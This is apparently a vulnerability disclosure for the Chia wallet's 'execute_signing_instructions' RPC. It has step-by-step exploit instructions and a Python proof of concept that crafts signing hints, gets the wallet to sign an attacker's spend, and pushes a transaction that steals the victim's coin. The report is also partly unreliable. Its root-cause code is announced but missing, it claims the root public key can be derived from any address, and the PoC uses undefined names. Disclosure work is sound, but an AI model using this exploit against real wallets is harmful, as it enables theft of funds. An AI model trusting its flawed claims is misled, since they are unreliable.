### Title
`Wallet.execute_signing_instructions` Blindly Signs Attacker-Controlled Messages with Wallet Private Keys via Unvalidated `SumHint` — (`File: chia/wallet/wallet.py`)

### Summary

`Wallet.execute_signing_instructions` in `chia/wallet/wallet.py` accepts fully attacker-controlled `SigningInstructions` via the `execute_signing_instructions` RPC endpoint and will sign any arbitrary message with the wallet's own derived private keys. The `SumHint.synthetic_offset` field is unconditionally converted to a `PrivateKey` and injected into the signing key table, and `SigningTarget.message` is signed without any validation that it corresponds to a legitimate pending coin spend. An attacker with access to the wallet RPC can craft `PathHint`/`SumHint`/`SigningTarget` triples that cause the wallet to produce a valid BLS signature over a malicious spend bundle, enabling theft of any coin locked to the wallet's standard addresses.

**Root cause — `chia/wallet/wallet.py`, `execute_signing_instructions`, lines 558–641:**

**Exploit path (concrete):**

1. Attacker knows victim's wallet root public key `root_pk` (derivable from any observed address).
2. Attacker identifies a victim coin at address index `N`. Computes `child_pk = master_pk_to_wallet_pk_unhardened(root_pk, N)`.
3. Attacker computes the correct synthetic offset: `offset = sha256(child_pk || DEFAULT_HIDDEN_PUZZLE_HASH) mod GROUP_ORDER` — this is deterministic and public.
4. Attacker computes `synthetic_pk = child_pk + PrivateKey.from_bytes(offset.to_bytes(32)).get_g1()`.
5. Attacker crafts a malicious delegated puzzle: `(1, [(CREATE_COIN, attacker_address, coin_amount)])`.
6. Attacker computes `message = hash(malicious_delegated_puzzle) + victim_coin_id + AGG_SIG_ME_ADDITIONAL_DATA`.
7. Attacker calls `execute_signing_instructions` RPC with:
   - `PathHint(root_pk.fingerprint, [12381, 8444, 2, N])` → forces wallet to derive `child_sk`
   - `SumHint([child_pk.fingerprint], offset.to_bytes(32), bytes(synthetic_pk))` → `fingerprints_we_have = [child_pk.fingerprint]`, `offset_sk` injected
   - `SigningTarget(synthetic_pk.fingerprint, message, hook)`
8. Wallet signs `message` with `child_sk` (augmented with `synthetic_pk`) and with `offset_sk` (augmented with `synthetic_pk`). Returns the aggregate.
9. The aggregate is a valid BLS signature for `synthetic_pk` over `message`.
10. Attacker submits spend bundle: victim coin + `puzzle_for_synthetic_public_key(synthetic_pk)` + `[[], malicious_delegated_puzzle, []]` + the obtained signature.
11. Full node accepts the spend; coin is transferred to attacker.

### Impact Explanation

**High — Bypass of wallet authorization enabling unauthorized signing and coin control.**

Any caller with access to the wallet RPC can obtain a valid BLS signature from the wallet's synthetic private key over an arbitrary message. Because Chia's standard coin puzzle (`p2_delegated_puzzle_or_hidden_puzzle`) authorizes any delegated puzzle whose hash is signed by the synthetic key, the attacker can redirect any coin locked to the wallet's standard addresses to an attacker-controlled address. This affects XCH, CATs, NFTs, and any asset using the standard wallet puzzle.

### Likelihood Explanation

The wallet RPC is protected by SSL client certificates and is typically bound to localhost. However:
- Any application granted wallet RPC access (DApps, wallet extensions, CLI tools) can exploit this.
- The `execute_signing_instructions` endpoint is explicitly designed for external signers (CHIP-0028), broadening the attack surface.
- All inputs needed to craft the exploit (root public key, coin IDs, address indices) are publicly observable on-chain.
- No privileged key material is required beyond RPC access.

### Recommendation

1. **Bind signing to pending transactions:** Before signing, verify that `SigningTarget.message` matches `delegated_puzzle_hash + coin_id + AGG_SIG_ME_ADDITIONAL_DATA` for a transaction record that the wallet itself generated and has in its pending store.
2. **Validate `SumHint.synthetic_offset`:** Verify that the provided `synthetic_offset` equals `sha256(component_pk || DEFAULT_HIDDEN_PUZZLE_HASH) mod GROUP_ORDER` for the referenced component key, rather than accepting arbitrary bytes as a private key.
3. **Validate `SumHint.final_pubkey`:** Verify that `final_pubkey == sum(component_pks) + offset_pk` rather than accepting it as an opaque attacker-supplied value.
4. **Scope `execute_signing_instructions` to wallet-originated instructions only:** The endpoint should only process `SigningInstructions` objects that were produced by `gather_signing_info` for transactions in the wallet's own pending store.

### Proof of Concept

```python
import hashlib
from chia_rs import AugSchemeMPL, G1Element, PrivateKey
from chia.wallet.signer_protocol import SigningInstructions, KeyHints, SumHint, PathHint, SigningTarget
from chia.wallet.wallet_request_types import ExecuteSigningInstructions
from chia.types.condition_opcodes import ConditionOpcode
from chia.types.blockchain_format.program import Program
from chia.util.ints import uint64
from chia.wallet.puzzles.p2_delegated_puzzle_or_hidden_puzzle import (
    DEFAULT_HIDDEN_PUZZLE_HASH, calculate_synthetic_offset
)
from chia.consensus.default_constants import DEFAULT_CONSTANTS

# Attacker knows victim's root public key (public info from any observed address)
root_pk: G1Element = victim_wallet.root_pubkey  # public

# Derive child key at index N (all public computation)
N = 0
child_pk = master_pk_to_wallet_pk_unhardened(root_pk, N)

# Compute correct synthetic offset (deterministic, public)
offset_int = calculate_synthetic_offset(child_pk, DEFAULT_HIDDEN_PUZZLE_HASH)
offset_bytes = offset_int.to_bytes(32, "big")
offset_sk = PrivateKey.from_bytes(offset_bytes)
synthetic_pk = child_pk + offset_sk.get_g1()

# Craft malicious delegated puzzle: send coin to attacker
attacker_address = bytes32(b"A" * 32)
malicious_delegated_puzzle = Program.to((1, [[ConditionOpcode.CREATE_COIN, attacker_address, victim_coin.amount]]))

# Compute the message the wallet will sign
message = (
    malicious_delegated_puzzle.get_tree_hash()
    + victim_coin.name()
    + DEFAULT_CONSTANTS.AGG_SIG_ME_ADDITIONAL_DATA
)

# Craft malicious SigningInstructions
evil_instructions = SigningInstructions(
    KeyHints(
        sum_hints=[SumHint(
            fingerprints=[child_pk.get_fingerprint().to_bytes(4, "big")],
            synthetic_offset=offset_bytes,
            final_pubkey=bytes(synthetic_pk),
        )],
        path_hints=[PathHint(
            root_fingerprint=root_pk.get_fingerprint().to_bytes(4, "big"),
            path=[uint64(12381), uint64(8444), uint64(2), uint64(N)],
        )],
    ),
    targets=[SigningTarget(
        fingerprint=synthetic_pk.get_fingerprint().to_bytes(4, "big"),
        message=message,
        hook=bytes32(b"\x00" * 32),
    )],
)

# Call the RPC — wallet signs the malicious message
response = await wallet_rpc_client.execute_signing_instructions(
    ExecuteSigningInstructions(signing_instructions=evil_instructions, partial_allowed=False)
)
stolen_signature = G2Element.from_bytes(response.signing_responses[0].signature)

# Build and submit the spend bundle
from chia.types.spend_bundle import SpendBundle
from chia.types.coin_spend import make_spend
from chia.wallet.puzzles.p2_delegated_puzzle_or_hidden_puzzle import (
    puzzle_for_synthetic_public_key, solution_for_delegated_puzzle
)

puzzle = puzzle_for_synthetic_public_key(synthetic_pk)
solution = solution_for_delegated_puzzle(malicious_delegated_puzzle, Program.to(0))
spend_bundle = SpendBundle(
    [make_spend(victim_coin, puzzle, solution)],
    stolen_signature,
)
await full_node_client.push_tx(spend_bundle)
# Coin is now sent to attacker_address
```
